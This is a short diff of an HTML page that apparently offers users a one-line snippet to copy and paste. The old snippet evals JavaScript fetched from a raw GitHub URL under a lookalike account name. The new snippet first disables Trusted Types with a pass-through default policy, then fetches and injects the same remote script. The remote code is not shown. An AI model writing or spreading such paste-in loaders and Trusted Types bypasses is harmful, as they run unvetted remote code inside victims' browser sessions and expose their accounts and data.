@@ -101,7 +101,7 @@
             <div class="p-4 flex flex-col md:flex-row gap-4">
                 <input 
                     type="text" 
-                    value="eval(await (await fetch('https://raw.githubusercontent.com/unabletoIoad/NebulaX/main/main.js')).text());" 
+                    value="trustedTypes.createPolicy('default', { createHTML: s => s, createScript: s => s });\nfetch('https://raw.githubusercontent.com/unabletoIoad/NebulaX/main/main.js').then(r=>r.text()).then(s=>{const e=document.createElement('script');e.textContent=s;document.body.appendChild(e)});" 
                     readonly
                     class="flex-1 p-3 bg-black/30 border border-purple-500 text-white focus:outline-none focus:border-purple-400 focus:ring-1 focus:ring-purple-400 transition-all"
                 >
